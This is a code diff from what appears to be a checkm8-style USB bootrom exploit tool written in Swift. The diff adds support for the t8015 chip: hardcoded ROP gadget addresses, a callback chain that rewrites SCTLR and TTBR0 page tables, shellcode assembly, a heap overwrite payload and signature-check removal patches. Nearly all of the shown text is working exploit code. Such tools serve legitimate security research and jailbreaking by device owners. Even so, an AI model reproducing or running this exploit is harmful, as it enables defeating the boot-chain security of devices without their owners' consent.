@@ -250,6 +250,62 @@ fileprivate func getDevicePayload(device: Int) -> Data {
         
         return struct_pack("<1024sQ504x2Q496s32x", t8011_shellcode, 0x1000006A5 as UInt64, 0x60000180000625 as UInt64, 0x1800006A5 as UInt64, loadShellcode64(name: "t8010_t8011_disable_wxn_arm64", constants: [])) + usb_rop_callbacks(address: 0x1800B0800, func_gadget: t8011_func_gadget, callbacks: t8011_callbacks)
         
+    case 0x8015:
+        let constants_usb_t8015 = [
+            0x18001C000,        // 1 - LOAD_ADDRESS
+            0x6578656365786563, // 2 - EXEC_MAGIC
+            0x646F6E65646F6E65, // 3 - DONE_MAGIC
+            0x6D656D636D656D63, // 4 - MEMC_MAGIC
+            0x6D656D736D656D73, // 5 - MEMS_MAGIC
+            0x10000B9A8,        // 6 - USB_CORE_DO_IO
+        ] as [UInt64]
+        let constants_checkm8_t8015 = [
+            0x180008528,          // 1 - gUSBDescriptors
+            0x180003A78,          // 2 - gUSBSerialNumber
+            0x10000AE80,          // 3 - usb_create_string_descriptor
+            0x1800008FA,          // 4 - gUSBSRNMStringDescriptor
+            0x18001BC00,          // 5 - PAYLOAD_DEST
+            PAYLOAD_OFFSET_ARM64, // 6 - PAYLOAD_OFFSET
+            PAYLOAD_SIZE_ARM64,   // 7 - PAYLOAD_SIZE
+            0x180008638,          // 8 - PAYLOAD_PTR
+            0x18000C400,          // 9 - page
+            0x60000100000625,     // 10 - new_perm
+        ] as [UInt64]
+
+        let t8015_load_write_gadget:        UInt64 = 0x10000945C
+        let t8015_write_sctlr_gadget:       UInt64 = 0x1000003EC
+        let t8015_func_gadget:              UInt64 = 0x10000A9AC
+        let t8015_dc_civac:                 UInt64 = 0x1000004D0
+        let t8015_write_ttbr0:              UInt64 = 0x10000045C
+        let t8015_tlbi:                     UInt64 = 0x1000004AC
+        let t8015_dmb:                      UInt64 = 0x1000004F0
+        let t8015_handle_interface_request: UInt64 = 0x10000BCCC
+        let t8015_callbacks = [
+            (t8015_dc_civac, 0x18001C800) as (UInt64, UInt64),
+            (t8015_dc_civac, 0x18001C840) as (UInt64, UInt64),
+            (t8015_dc_civac, 0x18001C880) as (UInt64, UInt64),
+            (t8015_dmb, 0) as (UInt64, UInt64),
+            (t8015_write_sctlr_gadget, 0x100D) as (UInt64, UInt64),
+            (t8015_load_write_gadget, 0x18001C000) as (UInt64, UInt64),
+            (t8015_load_write_gadget, 0x18001C010) as (UInt64, UInt64),
+            (t8015_write_ttbr0, 0x180020000) as (UInt64, UInt64),
+            (t8015_tlbi, 0) as (UInt64, UInt64),
+            (t8015_load_write_gadget, 0x18001C020) as (UInt64, UInt64),
+            (t8015_write_ttbr0, 0x18000C000) as (UInt64, UInt64),
+            (t8015_tlbi, 0) as (UInt64, UInt64),
+            (0x18001C800, 0) as (UInt64, UInt64),
+        ] as [(UInt64, UInt64)]
+
+        let t8015_callback_data = usb_rop_callbacks(address: 0x18001C020, func_gadget: t8015_func_gadget, callbacks: t8015_callbacks)
+        let t8015_handler = asm_arm64_x7_trampoline(dest: t8015_handle_interface_request) + asm_arm64_branch(src: 0x10, dest: 0x0) + loadShellcode64(name: "usb_0xA1_2_arm64", constants: constants_usb_t8015).advanced(by: 4)
+        var t8015_shellcode = loadShellcode64(name: "checkm8_arm64_8015", constants: constants_checkm8_t8015)
+        require(t8015_shellcode.count <= PAYLOAD_OFFSET_ARM64)
+        require(t8015_handler.count <= PAYLOAD_SIZE_ARM64)
+        t8015_shellcode = t8015_shellcode + Data(repeating: 0, count: Int(PAYLOAD_OFFSET_ARM64 - UInt64(t8015_shellcode.count))) + t8015_handler
+        require(t8015_shellcode.count <= 0x400)
+        
+        return struct_pack("<6Q16x448s1536x1024s", (0x180020400 - 8) as UInt64, 0x1000006A5 as UInt64, (0x180020600 - 8) as UInt64, 0x180000625 as UInt64, (0x18000C600 - 8) as UInt64, 0x180000625 as UInt64, t8015_callback_data, t8015_shellcode)
+
     default:
         fail("Payload generation not implemented for device!")
     }
@@ -258,6 +314,7 @@ fileprivate func getDevicePayload(device: Int) -> Data {
 fileprivate func getDeviceConfigs() -> [PwnUSBDeviceConfig] {
     let t8010_nop_gadget: UInt64 = 0x10000CC6C
     let t8011_nop_gadget: UInt64 = 0x10000CD0C
+    let t8015_nop_gadget: UInt64 = 0x10000A9C4
     
     // s5l8960 is not supported
     /*let s5l8960_overwrite = struct_pack("<32xQ8x", 0x180380000 as UInt64)
@@ -274,6 +331,11 @@ fileprivate func getDeviceConfigs() -> [PwnUSBDeviceConfig] {
     let t8011_payload = getDevicePayload(device: 0x8011)
     let t8011_rmsigchks = rmsigchks_patchesFor(device: 0x8011)
     let t8011_iStrap = iStrap_patchesFor(device: 0x8011)
+
+    let t8015_overwrite = struct_pack("<32x2Q", t8015_nop_gadget, 0x18001C020 as UInt64)
+    let t8015_payload = getDevicePayload(device: 0x8015)
+    let t8015_rmsigchks = rmsigchks_patchesFor(device: 0x8015)
+    let t8015_iStrap = iStrap_patchesFor(device: 0x8015)
     
     return [
         // s5l8960 - NOT SUPPORTED
@@ -283,7 +345,10 @@ fileprivate func getDeviceConfigs() -> [PwnUSBDeviceConfig] {
         PwnUSBDeviceConfig(version: "iBoot-2696.0.0.1.33", largeLeak: false, leak: 1, overwrite: t8010_overwrite, overwriteOffset: 0x5C0, hole: 5, payload: t8010_payload, dfuUploadBase: 0x1800B0000, rmsigchksPatches: t8010_rmsigchks, iStrapPatches: t8010_iStrap, iStrapDisableDFUFunc: 0x0),
         
         // t8011
-        PwnUSBDeviceConfig(version: "iBoot-3135.0.0.2.3", largeLeak: false, leak: 1, overwrite: t8011_overwrite, overwriteOffset: 0x540, hole: 6, payload: t8011_payload, dfuUploadBase: 0x1800B0000, rmsigchksPatches: t8011_rmsigchks, iStrapPatches: t8011_iStrap, iStrapDisableDFUFunc: 0x0)
+        PwnUSBDeviceConfig(version: "iBoot-3135.0.0.2.3", largeLeak: false, leak: 1, overwrite: t8011_overwrite, overwriteOffset: 0x540, hole: 6, payload: t8011_payload, dfuUploadBase: 0x1800B0000, rmsigchksPatches: t8011_rmsigchks, iStrapPatches: t8011_iStrap, iStrapDisableDFUFunc: 0x0),
+
+        // t8015
+        PwnUSBDeviceConfig(version: "iBoot-3332.0.0.1.23", largeLeak: false, leak: 1, overwrite: t8015_overwrite, overwriteOffset: 0x540, hole: 6, payload: t8015_payload, dfuUploadBase: 0x18001C000, rmsigchksPatches: t8015_rmsigchks, iStrapPatches: t8015_iStrap, iStrapDisableDFUFunc: 0x0)
     ]
 }
 
